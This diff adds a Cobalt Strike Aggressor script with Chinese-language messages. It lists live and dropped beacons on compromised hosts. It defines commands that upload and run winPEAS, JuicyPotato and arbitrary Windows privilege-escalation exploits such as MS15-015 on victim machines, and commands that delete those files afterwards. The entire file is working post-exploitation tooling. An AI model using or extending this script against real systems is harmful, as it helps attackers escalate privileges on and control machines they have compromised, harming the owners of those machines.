@@ -1,0 +1,102 @@
+bind Ctrl+L{
+	$beacons = beacons();
+	$survive = @();
+	$death = @();
+	if (strlen($beacons) > 0){
+		foreach $entry ($beacons){
+			$alive = $entry["alive"];
+			$data = "ip: ".$entry["external"]." computer:".$entry["computer"]." user:".$entry["user"]." last:".$entry["last"]."s";
+			if($alive eq 'true'){
+				add($survive, $data, -1);
+			}else{
+				add($death, $data, -1);
+			}
+		}
+		show_message("存活主机数量：".size($survive)."\n掉线机器数量:".size($death)."\n".join("\n", $death));
+	}
+}
+
+
+alias winpeas{
+	if ($2 eq "del"){
+		bcd($1, "C:\\Temp");
+		brm($1, "winpeas.bat");
+	}else{
+		bupload($1, script_resource("winPEAS.bat"));
+		bmv($1, "winPEAS.bat", "C:\\Temp\\winpeas.bat");
+		bcd($1, "C:\\Temp");
+		bshell($1, "winpeas.bat");
+	}
+}
+
+alias JuicyPotato{
+	$args = $2;
+	$cmd = $3;
+	if ((strlen($args) > 0) && (strlen($cmd) > 0)){
+		if($2 !eq "del"){
+			blog($1, $args);
+			$command ="$args "."$cmd";
+			bshell($1, "JuicyPotato.exe ".$command);
+		}
+	}else if($args eq "del"){
+			bcd($1, "C:\\Temp");
+			brm($1, "JuicyPotato.exe");
+	}else{
+			bupload($1, script_resource("JuicyPotato.exe"));
+			# bmv($1, "JuicyPotato.exe", "C:\\Temp\\JuicyPotato.exe");
+			bcd($1, "C:\\Temp");
+			bshell($1, "JuicyPotato.exe");
+	}
+}
+
+
+$evpath = "";
+popup beacon_bottom{
+	item "常用提权"{
+		prompt_text("提权exp路径设置", "D:\\tools\\ctf\\exploit\\windows exploit\\elevated privileges\\15015\\MS15-015\\Release\\", lambda({
+			$evpath = "$1";
+			blog($ids, $evpath);
+		}, $ids => $1));
+	}
+}
+
+alias winexp{
+	@files = ls($evpath);
+	if (strlen($2) > 0){
+		if (((strlen($2) > 0) && (strlen($3) > 0) && (strlen($4) > 0)) || (strlen($2) > 0) && (strlen($3) > 0) || (strlen($5) > 0) || (strlen($6) > 0)){
+			if (($2 eq "replace") && (strlen($3) > 0)){
+				$command = replace($3, "@", " ");
+				bshell($1, $command);
+			}else if ((strlen($6) > 0)){
+				$command = $2." $3 $4 $5 $6";
+				bshell($1, $command);
+			}else if ((strlen($5) > 0)){
+				$command = $2." $3 $4 $5";
+				bshell($1, $command);
+			}else if ((strlen($4) > 0)){
+				$command = $2." $3 $4";
+				bshell($1, $command);
+			}else if($3 eq "0"){
+				bshell($1, $2);
+			}else{
+				$command = $2." $3";
+				bshell($1, $command);
+			}
+		}else{
+			$test = $evpath.$2;
+			if($test in @files){
+				blog($1, strlen($test)." path:".$test);
+				bupload($1, $test);
+				bshell($1, $2);
+			}else{
+				berror($1, "file: $test not found");
+			}
+		}
+	}else{
+		blog2($1, "beacon上的常用提权设置路径，路径结尾记得加/或\->C:\ or /root/home/")
+		blog2($1, "winexp MS15-015.exe #上传MS15-015.exe");
+		blog2($1, "winexp potato.exe 0 #无参数执行exp");
+		blog2($1, "winexp MS15-015.exe \"whoami\" #执行exp");
+		blog2($1, "最多支持6个参数的exp，如果需要多个参数执行：winexp replace exp.exe@-d@1@-c@{11111111-11111111-11111111}@-p@whoami")
+	}
+}
